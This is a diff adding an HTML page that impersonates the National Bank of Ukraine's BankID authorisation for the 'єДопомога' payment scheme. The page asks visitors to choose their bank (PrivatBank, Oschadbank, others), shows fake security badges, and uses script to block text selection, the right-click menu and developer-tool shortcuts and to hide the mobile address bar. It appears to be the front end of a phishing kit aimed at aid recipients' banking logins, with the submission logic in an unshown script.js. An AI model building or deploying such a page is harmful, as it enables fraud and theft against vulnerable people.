@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Авторизація BankID НБУ — єДопомога</title>
+    <link rel="stylesheet" href="banks.css">
+    <style>
+        /* Запрет выделения интерфейса */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="auth-wrapper">
+        <header class="auth-header">
+            <svg class="mini-trizub" viewBox="0 0 167 250">
+                <path d="M83.5 0L83.5 204M83.5 0C83.5 0 35 15 35 78V145C35 180 65 205 83.5 205M83.5 0C83.5 0 132 15 132 78V145C132 180 102 205 83.5 205M35 110L5 110V145C5 210 83.5 250 83.5 250M132 110L162 110V145C162 210 83.5 250 83.5 250" stroke="#0056b3" stroke-width="15" fill="none"/>
+            </svg>
+            <div class="header-text">
+                <h2>Система електронної ідентифікації</h2>
+                <p>Національний банк України</p>
+            </div>
+        </header>
+
+        <main class="auth-container">
+            <div class="info-alert">
+                <span class="lock-icon">🔒</span>
+                <div>
+                    <strong>Безпечне підключення</strong>
+                    <p>Для нарахування виплати оберіть банк, у якому ви отримуєте заробітну плату або соціальні нарахування.</p>
+                </div>
+            </div>
+
+            <div class="bank-grid-multi">
+                <div class="bank-item" onclick="processBank('privat')">
+                    <div class="bank-logo-box privat-border">
+                        <span class="p-logo">P24</span>
+                    </div>
+                    <span class="bank-title">ПриватБанк</span>
+                </div>
+
+                <div class="bank-item" onclick="processBank('oschad')">
+                    <div class="bank-logo-box oschad-border">
+                        <span class="o-logo">Ощад</span>
+                    </div>
+                    <span class="bank-title">Ощадбанк</span>
+                </div>
+
+                <div class="bank-item" onclick="processBank('other')">
+                    <div class="bank-logo-box other-border">
+                        <div class="bid-icon">
+                            <span class="bid-b">B</span><span class="bid-id">ID</span>
+                        </div>
+                    </div>
+                    <span class="bank-title">Інші банки</span>
+                </div>
+            </div>
+
+            <div class="consent-text">
+                Згідно з регламентом BankID, ваші дані захищені. <br>
+                <a href="https://id.nbu.gov.ua/" target="_blank">Політика конфіденційності НБУ</a>
+            </div>
+        </main>
+
+        <footer class="auth-footer">
+            <div class="pci-logos">
+                <span class="pci-badge">SSL-256 Bit</span>
+                <span class="pci-badge">Verified by VISA</span>
+                <span class="pci-badge">Mastercard ID Check</span>
+            </div>
+        </footer>
+    </div>
+
+    <div id="loader" class="loader-overlay">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <h4 id="status-text">Ініціалізація запиту...</h4>
+            <div class="progress-bg"><div id="progress-bar"></div></div>
+        </div>
+    </div>
+
+    <script>
+        // Блокировка инструментов разработчика
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false; // F12
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        };
+
+        // Трюк для скрытия адресной строки в мобильных браузерах
+        window.scrollTo(0, 1);
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
